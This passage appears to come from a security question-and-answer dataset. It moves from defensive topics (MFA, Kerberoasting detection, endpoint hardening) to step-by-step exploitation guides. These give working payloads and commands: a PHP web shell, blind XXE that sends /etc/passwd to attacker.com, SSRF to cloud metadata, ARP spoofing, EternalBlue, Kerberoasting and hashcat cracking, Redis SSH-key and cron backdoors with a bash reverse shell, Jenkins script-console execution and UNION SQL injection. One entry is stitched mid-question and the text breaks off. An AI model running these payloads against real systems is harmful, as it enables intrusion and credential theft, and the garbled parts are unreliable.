Enforcement: mandatory MFA: no option to disable; cannot access without completing MFA; conditional: risk-based trigger (new device, unusual location, sensitive action); adaptive MFA: ML-based risk score triggers MFA only when needed. MFA bypass prevention: account recovery: if recovery bypasses MFA: weakest link; recovery codes or backup phone require MFA re-enrollment; remember device: 30-day remember device; reduces friction; must be per-device not per-account; clear all remembered devices on password reset or security event; CSRF on MFA endpoint: protect MFA submission form with CSRF token.
What is Kerberoasting prevention and detection?

Kerberoasting prevention and detection: specific hardening against Kerberos service account credential attack. Prevention: strong passwords for service accounts: Kerberoasting exploits weak passwords; 25+ character random password; cracking infeasible regardless of encryption type; Group Managed Service Accounts (gMSA): AD manages 240-character password automatically; rotates every 30 days; no human knows password; Kerberoasted hash cracking infeasible (password too long and complex); priority 1 for high-privilege service accounts; avoid RC4 encryption for Kerberos: RC4 (etype 0x17): easier to crack; AES256 (etype 0x12/0x11): harder to crack (no NTLM hash weakness); force AES: set msDS-SupportedEncryptionTypes = 24 on service accounts; client requests AES; RC4 not offered; monitoring and detection: detect Kerberoasting scan: Event 4769 (Kerberos Service Ticket Request): Ticket Encryption Type = 0x17 (RC4) and Service Name not ends with $ (not a machine account); many 4769 events from single source in short time = enumeration; alert: > 10 TGS requests for different SPNs from same workstation in 1 hour; Honey SPNs: create fake service account with SPN (no actual service); no legitimate reason to request ticket; any 4769 for honey SPN = Kerberoasting; alert immediately (zero false positives); example: Create-ADUser -SamAccountName honeypot -ServicePrincipalName MSSQLSvc/fake-server.corp.com:1433; monitor for TGS requests; BloodHound: before attackers use it; run BloodHound internally; identify accounts with weak passwords susceptible to Kerberoasting; prioritise gMSA migration; SIEM query example: Splunk: index=wineventlog EventCode=4769 TicketEncryptionType=0x17 ServiceName!= krbtgt | stats count by SourceIP, ServiceName | where count > 5; alert on threshold. AES enforcement: not all environments can enforce AES immediately; legacy applications may require RC4; migrate incrementally; test each service account after migrating to AES; validate service still functions.
What is endpoint security hardening?

Endpoint hardening: reduce attack surface on Windows/macOS/Linux workstations and servers; apply security baseline configurations. Windows hardening: CIS Benchmarks for Windows (free download): specific registry settings, policies, and configurations; 300+ recommendations; Level 1 (basic): safe to apply broadly; Level 2 (high security): may break some functionality; Microsoft Security Baselines: downloadable via Security Compliance Toolkit; Group Policy templates; specific settings: disable SMBv1 (obsolete, vulnerable to EternalBlue): Set-SmbServerConfiguration -EnableSMBProtocol1 $false; disable NTLM where possible: force Kerberos; disable RDP if not required (or restrict to jump server source only); Windows Defender Firewall: enable; inbound default deny; log dropped packets; disable unnecessary services: Telnet, FTP server, SNMP if unused, Spooler service on non-print servers; enable Windows Defender Antivirus: real-time protection; cloud-delivered protection; BitLocker: full disk encryption; TPM + PIN for high security; enable Secure Boot and UEFI; UAC (User Account Control): highest level; all elevations prompt; AppLocker or Windows Defender Application Control (WDAC): restrict which applications can run; allowlist; advanced threat protection controls: Attack Surface Reduction rules: block Office macros calling child processes, block executable content from email, block credential theft from LSASS; Enable Credential Guard: protect LSASS in isolated environment; prevent pass-the-hash. macOS hardening: Gatekeeper: only allow App Store and identified developers; Firewall: enable; block all incoming; FileVault: full disk encryption (like BitLocker); disable remote login (SSH) unless required; disable Remote Management unless required; Screen Lock: require password after 1-5 minutes; SIP (System Integrity Protection): enabled by default; protects system files; MDM-enforced settings (Jamf, Mosyle, Microsoft Intune). Linux hardening: CIS Benchmarks for Linux distributions; disable root SSH login; force key-based authentication; fail2ban: block IPs with multiple failed SSH attempts; SELinux or AppArmor: mandatory access control; disable unused services; auditd: system audit logging; filesystem permissions: check SUID binaries; Lynis: open-source Linux hardening assessment tool; AIDE: file integrity monitoring (baseline + periodic comparison). Patch management: OS patches: critical within 7 days; application patches: within 30 days; WSUS or Microsoft Endpoint Configuration Manager for Windows; Ansible/Chef/Puppet for Linux; automatic updates for workstations; scheduled maintenance windows for servers.
What is cloud security compliance automation?

Cloud security compliance automation: continuously validate cloud environment against regulatory and security standards; automated evidence collection and reporting. Why automation: manual audits: point-in-time; configuration drift between audits; cloud environments change constantly; automated: continuous monitoring; alert when compliance violated; remediate automatically; regulatory frameworks: PCI DSS (quarterly vulnerability scanning, network segmentation, access control), HIPAA (PHI protection, audit logging, access control), SOC 2 (availability, security, confidentiality, processing integrity, privacy controls), ISO 27001 (risk management, information security controls), FedRAMP (NIST SP 800-53 controls for federal cloud). AWS compliance automation: AWS Security Hub: aggregates findings from: AWS Config rules (resource configuration compliance), GuardDuty (threat detection), IAM Access Analyzer (external access), Macie (data classification), Inspector (vulnerability assessment); Security Hub standards: AWS Foundational Security Best Practices, CIS AWS Foundations Benchmark, PCI DSS; custom actions: SOAR integration; auto-remediate; AWS Config: record resource configuration changes; evaluate against rules: S3 bucket public read prohibited, EBS encryption enabled, RDS deletion protection enabled, CloudTrail enabled, MFA for root; conformance packs: collection of config rules (HIPAA operational best practices, CIS Level 1 and 2, PCI DSS); automated remediation: Config rule non-compliant -> EventBridge -> Lambda (remediate automatically); evidence collection: AWS Audit Manager: continuous evidence collection for compliance audits; built-in frameworks: SOC 2, HIPAA, PCI DSS, GDPR; automated evidence from: AWS Config, Security Hub, CloudTrail, Access Analyzer. Multi-cloud compliance: Prisma Cloud Compliance: 100+ built-in compliance frameworks; continuous assessment; automated remediation; evidence export; Wiz Compliance: compliance posture across AWS, Azure, GCP, OCI; ScoutSuite (open-source): multi-cloud security auditing; Prowler: AWS/Azure/GCP/Kubernetes open-source compliance; CIS Benchmarks compliance. DORA / GDPR automation: cloud-native tools for DORA (EU Digital Operational Resilience Act): incident management, testing, third-party risk; GDPR: data discovery (Macie/Purview), access logging (CloudTrail), data deletion audit trail; Compliance dashboard: executive dashboard showing overall compliance score; trend over time; risk by framework; highest-risk violations; remediation backlog. Shift left compliance: IaC scanning (Checkov, tfsec): validate Terraform against compliance standards before deployment; compliance as code: policy controls in Terraform; deploy only compliant resources; PR gate: compliance check before merge.

What is homograph attack and Unicode domain security?

Homograph attack (IDN homograph attack): register domain using Unicode characters that look visually identical to ASCII characters; phishing using lookalike domains. How it works: IDN (Internationalized Domain Names): allow Unicode characters in domain names (non-ASCII scripts); Punycode encoding: paypal.com in Cyrillic characters: рaуpal.com; a (Cyrillic) looks identical to a (Latin) in most fonts; browser displays: paypal.com (looks legitimate); actual domain: xn--pypal-4ve.com (Punycode encoding); victim clicks link; visits different domain; attacker controls domain. Homograph examples: paypal.com: р (Cyrillic р) replaces p; аpple.com: а (Cyrillic) replaces a; banking.com: bаnking.com with Cyrillic a; coinbase.com with various substitutions; any high-value brand susceptible. Browser mitigations: Chrome, Firefox: display Punycode form when domain mixes scripts from different scripts (Latin + Cyrillic): xn--pypal-4ve.com displayed instead of рaуpal.com; pure Cyrillic domain with Cyrillic browser locale: displayed in Cyrillic (legitimate); exception: some browsers have per-script allowlists. Homoglyph characters: Cyrillic: а (a), е (e), о (o), р (p), с (c), х (x), у (y); Greek: ο (o), Ⅰ (I); Armenian: հ (h), ս (s); Unicode special characters: zero-width characters (invisible), combining characters. Attack variants: email phishing: from: support@paypal.com (homoglyph); email sender display domain looks legitimate; email client may not decode Punycode; certificate: Let's Encrypt issues certs for homoglyph domains (valid TLS); HTTPS padlock provides false trust; phishing indicators disappear. Detection: browser URL bar: check carefully; hover over links before clicking; password manager: autofill only works on exact domain match; password manager does not fill credentials on homoglyph domain (cannot trick password manager); corporate: web proxy with URL analysis (Zscaler, Bluecoat: detect IDN domains); DNS: alert on DNS queries for IDN-encoded domains from internal network; brand protection: register homoglyph variants of your domain; monitor certificate transparency for lookalike domains (certstream); DMARC enforcement: prevents email spoofing of owned domain (but not lookalike domain).
How do you exploit HTTP request smuggling?

HTTP request smuggling: exploits disagreement between front-end (load balancer/proxy) and back-end server about where one HTTP request ends and the next begins. Two parsers disagree on Content-Length vs Transfer-Encoding headers. Attack types: CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding): send POST with both headers; front-end sees one large request; back-end sees smuggled prefix prepended to next victim request. TE.CL: opposite -- front-end uses TE, back-end uses CL. TE.TE: both support TE but can be confused by obfuscated TE header (Transfer-Encoding: xchunked). Impact: bypass front-end security controls (WAF, access control); poison web cache; capture other users requests (steal their session tokens, credentials); SSRF via smuggled request to internal endpoints. Detection with Burp Suite: HTTP Request Smuggler extension auto-detects; use time-delay technique: send CL.TE smuggled request; if vulnerable, second request to same socket times out because back-end waiting for body completion. Mitigation: disable reuse of back-end connections after forwarding request; use HTTP/2 (does not use CL/TE ambiguity); normalize requests at front-end before forwarding.
What is prototype pollution in JavaScript and how do you exploit it?

Prototype pollution: attacker modifies Object.prototype in a JavaScript application; since all objects inherit from Object.prototype, the added property is visible on every object. Sources: unsafe merge/clone functions that recursively copy user-supplied objects including __proto__ key; URL query string parsers; JSON.parse on untrusted input (safe by default, but custom parsers may be vulnerable). Payload: JSON object with __proto__ key: {"__proto__": {"polluted": "yes"}}; or URL: ?__proto__[polluted]=yes; or nested: {"constructor": {"prototype": {"polluted": "yes"}}}. Server-side (Node.js) code execution: if code calls child_process.exec() and spawns child with env from a polluted object; many lodash, jQuery, merge libraries had prototype pollution bugs. Client-side XSS: if application code: var opts = merge({}, userInput); element.innerHTML = opts.html || defaultHtml; attacker adds __proto__.html = "" via URL params; opts.html is now truthy, XSS executes. Detection: scan with Burp or manual fuzzing; inject __proto__[testpolluted]=1 into JSON body, URL params, cookie values; check if {} object in app response has testpolluted property. Mitigation: use Object.create(null) for dictionaries (no prototype); validate user input does not contain __proto__ or constructor keys; use Object.freeze(Object.prototype); use libraries that do safe merges.
How do you exploit XXE (XML External Entity) injection?

XXE injection: attacker injects malicious XML content with external entity declarations; XML parser resolves entities, allowing file read or SSRF. Basic file read payload: send XML body: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>; if application parses XML and reflects content, /etc/passwd contents appear in response. Blind XXE (out-of-band): application does not reflect parsed XML; use external DTD: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">%xxe;]>; evil.dtd contains: <!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % oob "<!ENTITY exfil SYSTEM 'https://attacker.com/?data=%data;'>">%oob;%exfil; file contents exfiltrated to attacker server via DNS/HTTP. SSRF via XXE: <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">; read AWS metadata service. Error-based XXE: trigger parse error that includes file content in error message. XXE in file upload: upload SVG, DOCX, XLSX, PDF (all XML-based); malicious entity in SVG: <svg><rect width="&xxe;" /></svg>. Finding XXE: look for XML content-type; try changing JSON to XML; test any file upload that accepts XML-based formats; change Content-Type to text/xml. Mitigation: disable external entity processing in XML parser (DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true) in Java); use JSON instead of XML; whitelist DTDs; use securely configured parsers.
Explain OAuth 2.0 vulnerabilities and how to exploit them.

OAuth 2.0 vulnerabilities: (1) CSRF on authorization endpoint: state parameter prevents CSRF; if state is missing or not validated, attacker can force victim to link their account to attacker OAuth token; tested by removing state param and checking if authorization proceeds. (2) Open redirect_uri: if server does not strictly validate redirect_uri, attacker registers client with redirect_uri=https://attacker.com; authorization code sent to attacker; attacker exchanges code for tokens. Exploit: if server allows partial match (prefix/regex), use redirect_uri=https://legitimate.com@attacker.com or https://legitimate.com.attacker.com. (3) Authorization code interception: if redirect_uri uses custom scheme (app://callback) on mobile; on Android, any app can register to handle that scheme; attacker app intercepts code. PKCE (Proof Key for Code Exchange) mitigates this. (4) Token leakage via Referer: if access token in URL fragment (#) and page loads external resources, Referer header leaks token. (5) Implicit flow vulnerabilities: access token in URL fragment is visible to JavaScript; if page has XSS, token stolen. (6) Account takeover via pre-authentication CSRF: create account with attacker email, initiate OAuth; victim logs in with OAuth for attacker email; accounts linked. (7) Scope upgrade: if authorization server accepts broader scopes than originally granted during token refresh. Testing: capture OAuth flow in Burp; test state removal/modification; test redirect_uri manipulation; test scope escalation; check token lifetime.
How do you test for insecure direct object references (IDOR)?

IDOR: application exposes internal object identifiers and fails to verify authorisation before serving the referenced object. Examples: GET /api/invoices/1337 returns invoice if user is authenticated but not verified to own invoice 1337; POST /profile/update with user_id=456 in body updates another users profile; download?file=invoice_2023_user456.pdf reveals predictable filename pattern. Testing methodology: (1) Map all endpoints that accept object identifiers (numeric IDs, UUIDs, filenames, hashes). (2) Use two accounts; note objects created/owned by Account A; authenticated as Account B, attempt to access Account A objects. (3) Test every parameter type: path parameters (/users/123), query params (?id=123), body parameters in POST/PUT, headers (X-User-Id), cookie values. (4) Test CRUD: not just GET (read); also PUT/PATCH (update), DELETE (delete), POST (action on object). Bypass techniques: change integer ID (1337 to 1338); UUID prediction (if v1 UUID uses timestamp+MAC); encode differently (base64, hex encoding of ID); add array ([123, 124] instead of 123); HTTP parameter pollution (?id=123&id=456); change case of UUID; add parameters the API ignores for validation but processes for access. Chained IDOR: find endpoint that returns indirect object reference, then use that reference in another request. Reporting: always demonstrate impact; show data from another account; document exact request and response; calculate number of records accessible.
What is a JWT vulnerability and how do you exploit alg=none?

JWT (JSON Web Token) vulnerabilities: JWT consists of header.payload.signature (base64url encoded, dot separated). Algorithm confusion attacks: (1) alg=none: if server accepts unsigned tokens; change header alg to none; remove signature; send header.payload. (some servers check signature only if alg requires it). (2) RS256 to HS256 confusion: if server uses RS256 (asymmetric) but also accepts HS256; attacker switches alg from RS256 to HS256; signs token with the RS256 PUBLIC KEY as the HMAC secret (public key is known to attacker); server verifies HS256 with same public key; attacker creates arbitrary tokens. (3) Weak HS256 secret: brute force with jwt_tool: python3 jwt_tool.py eyJhbGc... -C -d wordlist.txt; hashcat -m 16500 token.txt wordlist.txt. (4) JWT header injection (kid, jku, x5u): kid (key ID) used to look up signing key; if kid is path and used in file read: "kid":"../../dev/null" makes secret = empty string (known); jku (JWK Set URL) specifies URL to fetch public keys from; if not validated, set jku to attacker-controlled URL serving malicious JWK. (5) JWT in wrong location: try sending JWT in query parameter, cookie, or X-Auth-Token if Authorization header not accepted. Testing tool: jwt_tool (ticarpi/jwt_tool on GitHub); Burp JWT Editor extension for manipulation. Mitigation: enforce specific algorithm; use strong HS256 secrets (256-bit random); validate jku/x5c headers against whitelist; implement kid as database lookup not file path.

CSP bypass techniques: CSP restricts script sources to prevent XSS. Explain SSRF (Server-Side Request Forgery) and advanced exploitation techniques.

SSRF: server makes HTTP request to attacker-specified URL; server may have access to internal services not reachable from internet. Basic SSRF: POST /api/fetch with body url=http://internal-service/admin; server fetches internal endpoint, returns response to attacker. Cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS); http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (GCP, requires Metadata-Flavor: Google header); http://169.254.169.254/metadata/instance (Azure, requires Metadata: true header). SSRF filter bypass: IP obfuscation -- 2130706433 (decimal for 127.0.0.1); 0x7f000001 (hex); 127.1 (short form); 127.0.0.1.nip.io (DNS resolves to 127.0.0.1); http://spoofed.attacker.com (DNS A record pointing to 192.168.1.1); use redirect: attacker.com/redirect responds 302 to http://169.254.169.254/. URL scheme abuse: file:///etc/passwd (read local files); dict://internal:6379/INFO (Redis commands); gopher://internal:25/HELO (SMTP injection); ftp://internal:21/. Blind SSRF: application does not return response; use Burp Collaborator or interactsh to detect DNS/HTTP callbacks; time-based detection (slow response if internal host reached vs fast rejection). SSRF to RCE: access internal Redis without auth: gopher://127.0.0.1:6379/_SLAVEOF attacker.com 21000 (make Redis slave); reach internal Jenkins (port 8080) unauthenticated script console; write SSH key via Redis to authorized_keys.
How do you exploit file upload vulnerabilities?

File upload exploitation: upload functionality may allow executing malicious code on the server. Attack scenarios: (1) Upload web shell: if server stores file in webroot and executes PHP, ASP, JSP: upload shell.php containing <?php system($_GET[cmd]); ?>; access https://target.com/uploads/shell.php?cmd=id. (2) Extension bypass: server checks extension but inadequately: double extension (shell.php.jpg -- Apache may execute if misconfigured); null byte (shell.php%00.jpg in older PHP); alternate extensions (.phtml,.php5,.php7,.shtml,.phar for PHP); case variation (shell.PhP). (3) Content-type bypass: server checks Content-Type header but not actual content; send image/jpeg in header with PHP code in body. (4) Magic bytes: server checks file signature (magic bytes); prepend valid PNG header: PNG_HEADER + <?php system($_GET[cmd]); ?>; extension still.php. (5) Path traversal in filename: filename=../../webroot/shell.php if stored path is constructed from filename. (6) ImageMagick exploit: GhostScript/ImageMagick may process uploaded images; ImageTragick (CVE-2016-3714): embed MVG/MSL code in SVG upload. (7) Archive extraction: zip bomb; path traversal in zip entry (ZipSlip): zip containing../../etc/cron.d/backdoor. (8) XML-based uploads:.docx,.xlsx,.svg,.pptx contain XML; inject XXE entities. Post-upload: where is file stored? Accessible via URL? Which files are executed vs served? Is extension or MIME type checked server-side? Content-Disposition: attachment header prevents execution even if stored in webroot.
What is HTTP parameter pollution and how do you exploit it?

HTTP Parameter Pollution (HPP): submitting multiple values for same parameter; different server frameworks handle duplicates differently. Framework behavior for ?param=val1&param=val2: PHP: last value wins (val2); JSP/Servlet: first value wins (val1); ASP.NET: comma-joined (val1,val2). Exploit scenarios: (1) Signature/MAC bypass: if application signs request with first occurrence of parameter but sends second to backend: sign(amount=100) but backend processes amount=1000 from second occurrence. (2) Bypass WAF: WAF inspects first param value (benign), backend uses second (malicious). (3) Override application logic: if app constructs URL with user-supplied param and appended fixed param: url = base + "?redirect=" + user_input + "&fixed=1"; attacker sets user_input=malicious&fixed=evil; extra param can override fixed. (4) Split across encodings: a+b+c as param value; various decodings may produce different results. Testing: add duplicate parameters manually in Burp Repeater; test both query string and POST body; try same param in different locations (cookie AND query string). HPP in APIs: REST APIs may parse multiple occurrences differently; arrays in JSON vs repeated params. Defense: use framework that handles duplicates predictably; explicitly document expected behavior; reject requests with unexpected duplicate parameters.
How does a man-in-the-middle (MITM) attack work and how do you execute one?

MITM attack positions attacker between two communicating parties to intercept and optionally modify traffic. ARP poisoning (LAN MITM): ARP is stateless and unauthenticated; send gratuitous ARP replies poisoning ARP cache; associate gateway MAC address with attacker MAC: arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 (tell gateway that 192.168.1.1 is at attacker MAC) AND arpspoof -i eth0 -t 192.168.1.254 192.168.1.1 (tell 192.168.1.1 that gateway is at attacker MAC); enable IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward) to pass traffic; capture with Wireshark or Bettercap. SSL stripping: if attacker is MITM and victim navigates to http://bank.com (not HTTPS); attacker establishes HTTPS with bank.com but serves HTTP to victim; victim sees HTTP, sends credentials in cleartext; Bettercap includes SSL strip module; HSTS (HTTP Strict Transport Security) prevents this if preloaded. Evil twin WiFi: create rogue AP with same SSID as target network; force disconnection from legitimate AP via deauth frames (aireplay-ng -0 1 -a BSSID -c CLIENT); clients reconnect to evil twin; attacker controls traffic. Captive portal attack: clients connecting to open WiFi; present fake login page matching target org; capture credentials. Tools: Bettercap (comprehensive MITM framework); Ettercap; mitmproxy; Responder. Defense: ARP inspection (Dynamic ARP Inspection on managed switches); 802.1X port authentication; HTTPS everywhere + HSTS preloading; certificate pinning; VPN on untrusted networks.
Explain how to perform a DNS poisoning attack.

DNS cache poisoning: corrupting DNS resolver cache to return attacker-controlled IP for legitimate domain. Kaminsky attack (2008): DNS uses 16-bit transaction ID and source port for validation; Kaminsky discovered source port was predictable; attacker sends many forged DNS responses with all possible transaction IDs before legitimate response arrives; if forged response arrives first with matching ID, cache is poisoned for entire zone. Modern DNS hardening: randomised source ports (65,536 combinations * 65,536 TXIDs = 4.3 billion combinations -- much harder to guess); DNSSEC (cryptographic signatures on DNS records -- resolver validates signatures; attacker cannot forge signed records); DNS-over-HTTPS/TLS (prevents interception). Attack scenarios: (1) On-path MITM where attacker can intercept DNS traffic: modify DNS responses in transit; send forged answers with attacker IP. (2) Predictable TXID in old or misconfigured resolver: send flood of forged responses. (3) BGP hijacking + DNS: hijack IP prefix of authoritative DNS server; respond to DNS queries for target domain with attacker IP. Practical impact: redirect banking domain to phishing site; intercept email (MX record poisoning); DoS by returning NXDOMAIN. DNSSEC validation: resolver checks RRSIG (signature) against DNSKEY; chain of trust from root; even if response is forged, invalid signature detected. Tools: dnschef (DNS proxy/forwarder with spoofing); dnsspoof (DNS spoof on LAN via ARP poisoning).
How do you attack IPv6 networks?

IPv6 attack surface: (1) SLAAC (Stateless Address Autoconfiguration) attacks: SLAAC assigns IPv6 addresses via Router Advertisements (RA); attacker sends rogue RA on LAN claiming to be IPv6 router; hosts configure attacker as their IPv6 default gateway; MITM without ARP poisoning; tool: fake_router6 from the thc-ipv6 toolkit. (2) DHCPv6 attacks: attacker responds to DHCPv6 Solicit messages; assigns attacker as DNS server; DNS hijacking for all IPv6-enabled hosts; Responder supports rogue DHCPv6. (3) Neighbor Discovery Protocol (NDP) spoofing: NDP replaces ARP in IPv6; attacker sends unsolicited Neighbor Advertisement claiming to be the gateway; poisons NDP cache. (4) IPv6 tunnels as evasion: if firewall blocks IPv4 but allows IPv6 or vice versa; 6to4, Teredo, ISATAP tunnels carry IPv6 over IPv4; may bypass security controls focused on IPv4. (5) Dual-stack environments: hosts have both IPv4 and IPv6; if security monitoring or WAF only inspects IPv4, attacker communicates via IPv6 unmonitored; many Windows hosts prefer IPv6 over IPv4 (RFC 3484 preference table). (6) Extension header abuse: IPv6 supports extension headers for routing, fragmentation; fragmentation of security headers can bypass firewall/IDS signature matching. (7) Multicast abuse: IPv6 uses multicast heavily (no broadcast); all-routers multicast group; reconnaissance by sending to multicast addresses to identify all routers and hosts. Tools: thc-ipv6 toolkit; chiron (IPv6 security assessment framework).
How do you enumerate and attack SMB (Server Message Block)?

SMB attack methodology: Port 445 (direct) or 139 (NetBIOS over TCP). Enumeration: null session (anonymous): smbclient -N -L //TARGET; smbmap -H TARGET (list shares, permissions); enum4linux -a TARGET (full enum: shares, users, groups, password policy). Authenticated enumeration: smbmap -H TARGET -u user -p pass; crackmapexec smb 10.0.0.0/24 -u user -p pass --shares. Anonymous share access: mount open share: smbclient //TARGET/SHARE -N; look for configuration files, passwords, executable scripts, documents with sensitive data. Exploits: MS17-010 (EternalBlue): Windows 7/Server 2008R2 and earlier; unauthenticated RCE via buffer overflow in SMBv1; nmap --script smb-vuln-ms17-010 TARGET; Metasploit: use exploit/windows/smb/ms17_010_eternalblue. MS08-067: Windows XP/Server 2003 unauth RCE. PrintNightmare (CVE-2021-1675/34527): local privilege escalation or remote code execution via Print Spooler; exploit with impacket or Cube0x0 PoC. SMB relay: if SMB signing disabled (common on non-DC Windows), relay captured NTLM authentication to another host; ntlmrelayx.py -tf targets.txt; works with Responder in capture mode. Brute force: crackmapexec smb TARGET -u userlist.txt -p passlist.txt --no-bruteforce (spray one password per user); hydra -L users.txt -P passwords.txt smb://TARGET. Password spraying avoids lockout: one attempt per account then wait.
What is Kerberoasting and how do you perform it?

Kerberoasting: offline brute-force attack against service account passwords by exploiting Kerberos TGS (Ticket Granting Service) mechanism. Background: any domain user can request a Kerberos service ticket for any SPN (Service Principal Name); ticket is encrypted with the service account NTLM hash (RC4) or AES key; if account uses weak password, hash can be cracked offline. Requirements: valid domain user account (low privilege); service account with SPN set (SPNs are set on service accounts running services like SQL Server, IIS, etc). Attack steps: (1) Enumerate SPNs: GetUserSPNs.py domain/user:pass@DC-IP -outputfile hashes.txt (Impacket); or Rubeus.exe kerberoast /outfile:hashes.txt (from domain-joined Windows). (2) Request TGS: GetUserSPNs.py automatically requests tickets for all SPNs and outputs in hashcat format. (3) Crack offline: hashcat -m 13100 hashes.txt rockyou.txt --rules /usr/share/hashcat/rules/best64.rule; no connection to DC needed during cracking; isolated offline attack. (4) Use cracked password: authenticate as service account; if service account is in privileged group, escalate. Prioritise: crack service accounts that are members of Domain Admins, local admins on servers, or have interesting delegations. Defense: use gMSA (Group Managed Service Accounts): 120-char auto-rotating random passwords = infeasible to crack; require AES encryption for all service accounts (prevents RC4 TGS -- AES cracking is slower); set strong (25+ char) passwords on all service accounts; monitor Event 4769 with encryption type 0x17.
Explain AS-REP Roasting and when it is applicable.

AS-REP Roasting: offline attack against Kerberos pre-authentication disabled accounts. Normal Kerberos pre-auth: when requesting TGT, client must prove identity by encrypting timestamp with NTLM hash; if pre-auth enabled, AS-REP (authentication server response) only sent after validating pre-auth data. Pre-auth disabled (AS-REP Roasting target): if account has UF_DONT_REQUIRE_PREAUTH flag; anyone can send AS-REQ (AS request) without pre-auth; KDC responds with AS-REP containing TGT encrypted with account password hash; attacker captures AS-REP and cracks hash offline. Requirements: no credentials needed (unlike Kerberoasting which requires a valid domain account); only need network connectivity to DC port 88. Attack: GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt (Impacket -- tries all users in list); Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt (requires domain join but no creds). Crack: hashcat -m 18200 asrep.txt rockyou.txt. Finding targets without credentials: if LDAP null session allowed, enumerate users with pre-auth disabled; otherwise, need user list (from web enumeration, email format guessing, common names). Defense: require pre-authentication for all accounts (check for UF_DONT_REQUIRE_PREAUTH flag, remove it); monitor Event 4768 with Pre-Authentication Type = 0 (no pre-auth); strong passwords on affected accounts.
How do you exploit weak or default SNMP configurations?

SNMP (Simple Network Management Protocol) exposes device configuration and performance data. Version vulnerabilities: SNMPv1 and v2c use community strings (shared password in cleartext) for authentication; default community string public (read-only) or private (read-write) on most devices. Enumeration: nmap -sU -p 161 --script snmp-info,snmp-interfaces,snmp-sysdescr TARGET; onesixtyone -c community.txt TARGET (community string brute force -- tries rockyou or snmp-common-communities wordlist); snmpwalk -c public -v 2c TARGET 1.3.6 (walk entire MIB tree). Information disclosure: system description (OS, version); running processes; network interfaces and IP addresses; installed software; open TCP/UDP ports; routing table; user accounts (some MIBs expose this); WiFi SSIDs and passwords (on some Cisco devices). Read-write access: if private community string found: snmpset command to modify configuration; on some routers: change SNMP config, redirect traffic, disable interfaces; Cisco IOS: can read/write configs via TFTP using SNMP. Exploitation: snmpwalk -c public -v 1 TARGET 1.3.6.1.2.1.25.4.2.1.2 (Windows running processes); 1.3.6.1.2.1.25.6.3.1.2 (installed software). SNMPv3 security: authentication (MD5/SHA) and encryption (AES/DES); requires username + auth password + priv password; much harder to exploit if configured correctly. Remediation: disable SNMPv1/v2c; use SNMPv3 with strong passwords; restrict SNMP to management VLAN via ACL; change default community strings; disable SNMP entirely if not needed.
How do you exploit Redis when it is exposed to the network?

Redis network exposure: Redis has no authentication by default; if bound to 0.0.0.0 or public interface, attackers can connect directly. Exploitation paths: (1) Direct access: redis-cli -h TARGET; INFO (server info); KEYS * (list all keys); GET key (read value); may contain session tokens, API keys, PII, cached credentials. (2) Write SSH keys (if Redis runs as root or user with home dir): CONFIG SET dir /root/.ssh; CONFIG SET dbfilename authorized_keys; SET sshkey "ssh-rsa AAAA...attacker_pubkey..."; BGSAVE; connect via SSH as root. (3) Write cron job (if Redis runs as root): CONFIG SET dir /etc/cron.d; CONFIG SET dbfilename backdoor; SET cron "

* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1

"; BGSAVE. (4) Master-slave replication for RCE (Redis 4.x+): SLAVEOF attacker 21000; attacker sends malicious.so module via replication protocol; MODULE LOAD /tmp/module.so; RCE via Redis module. (5) LUA sandbox escape (older Redis): EVAL "redis.call()" scripts executed in LUA sandbox; older versions had sandbox escapes. (6) Redis 7+ ACL: even with authentication, weak passwords brute-forceable; AUTH password. Discovery: masscan -p 6379 --rate=10000 0.0.0.0/0 (find open Redis); Shodan query: port:6379 redis. Remediation: bind to localhost only (bind 127.0.0.1); set requirepass in redis.conf with strong password; rename dangerous commands (CONFIG, SLAVEOF, MODULE); use ACLs for least-privilege; firewall port 6379.
Explain how to attack Jenkins and CI/CD systems.

Jenkins attack surface: CI/CD systems often have broad network access and store sensitive credentials. Unauthenticated access: Jenkins historically allowed anonymous access including Script Console (Groovy execution = RCE); check /script endpoint: if accessible, println("id".execute().text) gives command execution. CVE-2024-23897 (CLI path traversal, critical): unauthenticated file read via CLI @argument syntax; read /etc/passwd, Jenkins secrets, API keys. Credential exposure: Jenkins stores credentials (SSH keys, API tokens, passwords) in encrypted form; if you have script console access: decrypt them using Jenkins internal API. Script console RCE (authenticated or unauthenticated if misconfigured): println("bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|bash".execute().text); or Groovy reverse shell. Pipeline injection: if user-controlled data (PR title, branch name, commit message) is interpolated into Groovy pipeline script without sanitisation; inject arbitrary Groovy commands. Credential theft via pipeline: if pipelines have access to production credentials, compromising pipeline = credential access; withCredentials block exposes secrets inside steps. Lateral movement: Jenkins agents connect back to master; if you compromise Jenkins master, deploy payload to all agents; agents often run as privileged users on build servers. JMX remote access: if Java Management Extension port exposed, unauthenticated RCE via MBeans. Defense: disable script console for non-admins; use role-based access control plugin; keep Jenkins updated; use credentials binding properly; restrict network access to Jenkins; audit pipeline code for injection.
How do you perform a SQL injection attack with Union-based extraction?

Union-based SQLi extracts data by appending UNION SELECT to original query; data returned in application response alongside normal results. Prerequisites: application reflects database values in response; error-based or time-based used when no reflection. Step 1 -- find injection point: send single quote in parameter; if SQL error returned, injectable. Step 2 -- determine column count: ORDER BY 1, ORDER BY 2... ORDER BY N until error; number before error = column count. OR UNION SELECT NULL, NULL, NULL-- (increment NULLs until no error). Step 3 -- find string column: UNION SELECT NULL, "string-test", NULL-- (change NULL to string literal for each position; the position that reflects string-test in response is a string column). Step 4 -- extract data: UNION SELECT NULL, username||chr(58)||password, NULL FROM users-- (extract username:password from users table). MySQL: information_schema.tables (table names); information_schema.columns (column names); concat(username,0x3a,password) (hex for colon separator). PostgreSQL: pg_tables; string_agg(username||':'||password, ',') FROM users. Oracle: ALL_TABLES; DUAL table required (SELECT null FROM DUAL). MSSQL: sys.tables; sysobjects; xp_cmdshell (RCE if enabled); for /f 